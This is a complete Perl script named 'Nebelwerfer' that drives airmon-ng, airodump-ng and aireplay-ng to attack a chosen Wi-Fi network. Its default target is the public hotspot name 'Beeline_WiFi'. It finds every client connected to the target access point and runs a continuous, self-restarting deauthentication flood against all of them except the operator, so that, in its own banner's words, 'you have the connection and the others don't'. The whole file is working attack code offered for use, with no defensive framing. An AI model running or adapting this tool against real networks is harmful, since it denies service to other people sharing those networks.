#!/usr/bin/perl
#  Nebelwerfer. A huge perl-written weapon to take over wireless network
# Copyright (C) 2012 hagall (asbrandr@jabber.ru)

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

# Rev1, 20121028
# alpha build!

#-------------------------------------------------------------------------------
# 			Settings section
					# Wireless interface to use
	our $interface 		= "wlan0";
					# ESSID to attack
	our $gEssid		= "Beeline_WiFi";
					# List of friendly MACs that we won't
					# touch
	our @friendly_macs 	= qw//;
	
					# Sleep between live cycles
	our $sleep 		= 10;
					# Timeout to let airodump-ng capture 
					# some packets
	our $mon_timeout 	= 30;
					# Working directory. Using "/tmp/" is
					# recommended
	our $workdir 		= "/tmp/";
					# Filename prefix
	our $fileprefix 	= "nebelwerfer";
	
					# File pathes to the utilities
					# Yours may be different
	our $airmon 		= "/usr/local/sbin/airmon-ng";
	our $airodump 		= "/usr/local/sbin/airodump-ng";
	our $aireplay		= "/usr/local/sbin/aireplay-ng";
	our $ifconfig 		= "/sbin/ifconfig";
#-------------------------------------------------------------------------------

	use Term::ANSIColor qw /:constants/;
	use XML::DOM;
	use Time::HiRes qw/usleep/;
	use Data::Dumper;
	$| = 1;
	
	our $mon_index = 0;	
	`rm $workdir/$fileprefix* -f`;
	`rm $workdir/deauth* -f`;

	$SIG{INT}= $SIG{TERM} = \&term_handler;
	
	print YELLOW, BOLD;
	print "NEBELWERFER\n";
	print "-----------------------------------------\n";
	print "That awkward moment when you have the connection and the others don't\n\n";
	print RESET;

	
					# Turn our wireless card into monitor mode
	print YELLOW, BOLD, "Turning $interface into monitor mode...\n", RESET;
	system "$airmon start $interface";
	unless (`$ifconfig | grep mon`)
	{
		print RED, BOLD, "Cannot create monitor interface, something is wrong!\n";
		die "\n";
	}
		
					# Search for the last interface that have
					# been created
	($mon_index) = `$ifconfig | grep mon | tail -1` =~ /mon(\d+)/ ;
	
	print YELLOW, BOLD, "Using interface [mon$mon_index] for our purposes.\n", RESET;


					# Grep our MAC address from ifconfig
	`$ifconfig $interface up`;
	our ($our_mac) = `$ifconfig | grep $interface` =~ /(\w+:\w+:\w+:\w+:\w+:\w+)/;
	$our_mac = uc $our_mac;
	unless ($our_mac)
	{
		print RED, BOLD, "Cannot grep MAC address from interface $interface! Something is wrong!\n";	
	}
	print YELLOW, BOLD, "Our MAC address is: $our_mac\n", RESET;

					# Start airodump-ng and wait for some
					# time to let it capture enough packets
	our $monitor_pid = start_monitor("mon$mon_index");
	print YELLOW, BOLD, "Monitor script PID: $monitor_pid\n", RESET;
	
	our %client_macs;		# Hash. Client_MAC => pid_of_deauth
	
	print YELLOW, BOLD, "Sleeping for $mon_timeout seconds to let airodump capture enough packets...\n", RESET;
	sleep $mon_timeout;
	
					# Get BSSID for the specified ESSID
	my $bssids = get_bssids($gEssid);
	my ($bssid, $channel) = ("", 0);
	if (@$bssids == 0)
	{
		print "Cannot find ESSID $gEssid!\n";
		kill "TERM", $monitor_pid;
		system "$airmon stop mon$mon_index > /dev/null";
		exit 0;
	}
	
	if (@$bssids > 1)
	{
		print "There are more than one BSSID for specified ESSID:\n";
		for (my $i = 0; $i < scalar @$bssids; $i++)
		{
			print $i + 1;
			print ") ".$bssids->[$i]->{bssid}." (channel ".$bssids->[$i]->{channel}.", ".$bssids->[$i]->{clients}." clients)\n";
		}
		print "Enter the number of BSSID to choose: \n";
		my $index = int(<>);
		
		$bssid 		= $bssids->[$index - 1]->{bssid};
		$channel 	= $bssids->[$index - 1]->{channel};

					# Check input validity		
		until ($bssid)
		{
			print "Invalid number! Please re-enter: ";
			my $index = int(<>);		
			$bssid 		= $bssids->[$index - 1]->{bssid};
			$channel 	= $bssids->[$index - 1]->{channel};			
		}
		
	}
	else
	{
		$bssid = $bssids->[0]->{bssid};
		$channel = $bssids->[0]->{channel};
	}
	
					# Next step is to restart airmon-ng
					# That's quite important because 
					# wifi card can be only on one channel
					# at a time
	print YELLOW, BOLD, "Restarting monitor, fixing it at channel $channel\n";
	kill "TERM", $monitor_pid;

					# Wait until it's really killed
	usleep(100000) until (kill 0, $monitor_pid);
	
	$monitor_pid = start_monitor("mon$mon_index", $channel);
	
	
					# Create new monitor interface with 
					# specified channel
	print YELLOW, BOLD, "Creating another monitor interface...\n", RESET;
	`$airmon start $interface $channel`;
	
					# Get new monitor index
	our ($aireplay_monindex) = `$ifconfig | grep mon | tail -1` =~ /mon(\d+)/ ;
	print "For aireplay-ng we will use interface", YELLOW, BOLD, " mon$aireplay_monindex\n", RESET;
	print "AP: $bssid on channel $channel\n";
	
	
	do
	{

					# Grep clients that are associated with
					# desired AP
		my $cur_macs = get_clients($bssid);
		print "Clients found: ".@$cur_macs."\n";


					# Send deauth to clients which macs we
					# don't have in list
		foreach (@$cur_macs)
		{
			my $cmac = $_;
			next if (grep { $_ eq $cmac } keys(%client_macs));
			next if ($_ eq $our_mac);
			next if ($_ ~~ @friendly_macs);
			
			my $deauth_pid = deauth_session($_, $bssid);
			print YELLOW, BOLD, "Started deauth session for client $_ - PID $deauth_pid\n", RESET;			
			$client_macs{$_} = $deauth_pid;
			sleep 1;
		}
	
					# Check deauth sessions that may have been
					# expired and restart deauth for them
		foreach (keys %client_macs)
		{
			unless (kill 0, $client_macs{$_})	
			{
				my $deauth_pid = deauth_session($_, $bssid);
				$client_macs{$_} = $deauth_pid;
				print YELLOW, BOLD, "Restarted deauth session for client $_ - PID $deauth_pid\n", RESET;
				sleep 1;
			}
		}
	
					# Check if some clients have gone
		foreach (keys %client_macs)
		{
			next if ($_ ~~ @$cur_macs);
			print YELLOW, BOLD, "Client $_ have gone away. Stopping deauth session.\n", RESET;
			kill $client_macs{$_};
			delete $client_macs{$_};
		}
		
		print "Time ".time().", sleeping for $sleep seconds...\n";
		sleep $sleep;
		
					# Check for airodump existence 
		unless (kill 0, $monitor_pid)
		{
			print YELLOW, BOLD, "Airodump-ng has gone away for some fuck. Restarting.\n", RESET ;
			$monitor_pid = start_monitor("mon$mon_index", $channel);
			print YELLOW, BOLD, "Restarted with pid $monitor_pid\n", RESET;
		}
	}
	while (1);


#-------------------------------------------------------------------------------
# start_monitor(interface, channel)
# Starts airodump-ng for specified interface and channel
#
sub start_monitor
{
	my ($interface, $channel) = @_;
	my $mon_pid = fork();
	if ($mon_pid == 0)
	{

					# It's the child, run airodump end exit					
		open TESTSCR, ">", "$workdir/launchmon.sh" or die "Cannot create $workdir/launchmon.sh: $!\n";
		print TESTSCR "#!/bin/sh
				on_die()
				{
					kill -9 \$monitor_pid
					exit 0
				}

				trap on_die TERM
				$airodump ".($channel ? "$interface -c $channel" : "$interface")." -w $workdir/$fileprefix 2>/dev/null &
				monitor_pid=\$!
				wait \$monitor_pid
			      ";
		close TESTSCR;
		chmod 0755, "$workdir/launchmon.sh";
		exec "$workdir/launchmon.sh";
		exit 0;
	}
	
	return $mon_pid;
}


#-------------------------------------------------------------------------------
# deauth_session(macaddr, bssid)
# Writes a script for aireplay-ng to send deauth packets to some MAC address
#
sub deauth_session
{
	my ($target_mac, $bssid) = (@_);

	open TESTSCR, ">", "$workdir/deauth-$target_mac.sh" or die "Cannot create $workdir/deauth-$target_mac.sh: $!\n";
	print TESTSCR "#!/bin/sh
			on_die()
			{
				kill -9 \$deauth_pid
				exit 0
			}
			
			trap on_die TERM
			$aireplay -0 1000 -a $bssid -c $target_mac mon$aireplay_monindex > $workdir/deauthlog-$target_mac.log
			deauth_pid=\$!
			wait \$deauth_pid";
	close TESTSCR;
	chmod 0755, "$workdir/deauth-$target_mac.sh";
	my $deauth_pid = fork();
	if ($deauth_pid == 0)
	{
		exec "$workdir/deauth-$target_mac.sh";
		exit 0;	
	}
	
	return $deauth_pid;
}


#-------------------------------------------------------------------------------
# get_bssids(essid)
# Parses a bssid(s) for specified essid from XML file generated by airodump
#
sub get_bssids
{
	my ($essid) = @_;
	
	my $filename = "$workdir/$fileprefix-01.kismet.netxml";
	my $okread = 1;	
	my $result = [];
	
	do
	{
			
		eval {	
		my $xml = new XML::DOM::Parser;
		my $doc = $xml->parsefile($filename);
		my $root = $doc->getDocumentElement();
		my $networks = $root->getElementsByTagName("wireless-network");
		for(my $i = 0; $i < $networks->getLength(); $i++)
		{
			my $network = $networks->item($i);
			my $ssid_node = $network->getElementsByTagName("SSID")->item(0);
			my $ess_nodes = $ssid_node->getElementsByTagName("essid")->item(0)->getChildNodes;
			my $cur_essid = ($ess_nodes->getLength() == 0) ? 0 : $ess_nodes->item(0)->getNodeValue();
			my $cur_bssid = $network->getElementsByTagName("BSSID")->item(0)->getChildNodes->item(0)->getNodeValue();
			my $cur_channel = $network->getElementsByTagName("channel")->item(0)->getChildNodes->item(0)->getNodeValue();
			my $clients_count = $network->getElementsByTagName("wireless-client")->getLength();
		
			if ($cur_essid eq $essid)
			{
				push @$result, { "bssid" => $cur_bssid, "channel" => $cur_channel, "clients" => $clients_count };
			}		
		}
		$okread = 1;
		1;
		}
		or do
		{
			print "Error parsing XML file $filename! Will re-attempt in 3 seconds\n";
			$okread = 0;
			sleep 3;
		}
	}
	until ($okread);
			
	return $result;
}


#-------------------------------------------------------------------------------
# get_clients(bssid)
# Parses a list of clients for specified bssid from XML file generated by airodump
#
sub get_clients
{
	my ($bssid) = @_;
	
	my $filename = "$workdir/$fileprefix-01.kismet.netxml";

	my $okread = 1;	
	my $result = [];
	
	do
	{
		eval {
	
		my $xml = new XML::DOM::Parser;
		my $doc = $xml->parsefile($filename);
		my $root = $doc->getDocumentElement();
		my $networks = $root->getElementsByTagName("wireless-network");
	
		for(my $i = 0; $i < $networks->getLength(); $i++)
		{
			my $network = $networks->item($i);
			my $cur_bssid = $network->getElementsByTagName("BSSID")->item(0)->getChildNodes->item(0)->getNodeValue();
			my $clients_count = $network->getElementsByTagName("wireless-client")->getLength();
			if ($cur_bssid eq $bssid)
			{		
				foreach ($network->getElementsByTagName("wireless-client"))
				{
					my $client_mac = $_->getElementsByTagName("client-mac")->item(0)->getChildNodes->item(0)->getNodeValue();
					push @$result, $client_mac;
				}
			}
		}
		
		$okread = 1;
		1;
		} 
		or  do
		{
			print "Error parsing XML file $filename! Will re-attempt in 3 seconds\n";
			$okread = 0;
			sleep 3;
		}
	}
	until ($okread);
	
	return $result;
}


#-------------------------------------------------------------------------------
# term_handler
# Handles SIGKILL and SIGTERM signals
#
sub term_handler
{
	print YELLOW, BOLD, "Caught termination signal, killing everything that moves!\n", RESET;
	kill "TERM", $monitor_pid;
	print YELLOW, BOLD, "Killed monitor, pid $monitor_pid\n", RESET;
	
	foreach (keys %client_macs)
	{
		kill "TERM", $client_macs{$_};
		print YELLOW, BOLD, "Killed deauth session, pid $client_macs{$_}\n", RESET;		
	}
	
	print YELLOW, BOLD, "Stopping monitor interfaces...\n", RESET;
	system "$airmon stop mon$mon_index";
	system "$airmon stop mon$aireplay_monindex";
	exit 0;
}
